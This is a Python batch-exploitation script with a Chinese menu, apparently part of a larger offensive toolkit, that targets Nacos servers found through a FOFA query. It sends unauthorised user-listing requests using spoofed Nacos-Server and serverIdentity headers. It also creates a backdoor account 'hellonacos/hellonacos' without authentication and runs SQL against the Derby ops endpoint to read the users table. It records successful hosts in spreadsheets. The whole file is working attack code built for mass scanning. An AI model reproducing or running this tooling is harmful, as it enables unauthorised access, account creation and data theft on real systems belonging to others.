
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork

def help():
    print('''
    fofa：app="NACOS"
        1. Nacos未授权获取用户信息, 批量测试
        2. Nacos未授权新增用户, 批量测试
        3. Nacos SQL注入, 批量测试
    x. 退出
    ''')

def vul_userInfo1(url):
    headers = {
        'User-Agent': 'Nacos-Server',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    }
    path = "/nacos/v1/auth/users/?pageNo=1&pageSize=9"
    method = "GET"
    notes = ""
    body = ""
    return (url, method, headers, body, path, notes)


def vul_userInfo2(url):
    headers = {
        'User-Agent': 'Nacos-Server',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    }
    path = "/v1/auth/users/?pageNo=1&pageSize=9"
    method = "GET"
    notes = ""
    body = ""
    return (url, method, headers, body, path, notes)

def vul_userInfo3(url):
    headers = {
        'User-Agent': 'Nacos-Server',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'serverIdentity': 'security'
    }
    path = "/nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken"
    method = "GET"
    notes = ""
    body = ""
    return (url, method, headers, body, path, notes)


def vul_addUser(url):
    headers = {
        'User-Agent': 'Nacos-Server',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    body = "username=hellonacos&password=hellonacos"
    method = "POST"
    path = "/nacos/v1/auth/users"
    notes = ""
    return (url, method, headers, body, path, notes)


def vul_SQL(url):
    headers = {
        'User-Agent': 'Nacos-Server',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    }
    body = ""
    method = "GET"
    notes = ""
    path = "/nacos/v1/cs/ops/derby?sql=select * from users"
    return (url, method, headers, body, path, notes)



def run():
    OUTDIR = "result/Nacos"
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    file = "dat.txt"
    li = Tool.read_host_file(file)
    Tool.mkdir(OUTDIR)
    help()
    num = int(input("执行的指令: "))

    if num == 1:
        data = []
        for url in li:
            item = vul_userInfo1(url)
            data.append(item)
        for url in li:
            item = vul_userInfo2(url)
            data.append(item)
        for url in li:
            item = vul_userInfo3(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            try:
                response = v[-1]
                if v[1] != 0 and 'nacos' in response.text:
                    print(f'[+] {v[0]} -> getUserInfo')
            except Exception as E:
                print(E)
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}Nacos未授权获取用户信息.xlsx")

    elif num == 2:
        data = []
        for url in li:
            item = vul_addUser(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            try:
                response = v[-1]
                if v[1] != 0 and 'create' in response.text:
                    print(f'[+] {v[0]} -> getLogin: hellonacos/hellonacos')
            except Exception as E:
                print(E)
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}Nacos未授权新增用户.xlsx")

    elif num == 3:
        data = []
        for url in li:
            item = vul_SQL(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            try:
                response = v[-1]
                if v[1] != 0 and ':200' in response.text:
                    print(f'[+] {v[0]} -> 存在SQL注入')
            except Exception as E:
                print(E)
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}Nacos SQL注入.xlsx")

    else:
        print('bye..')
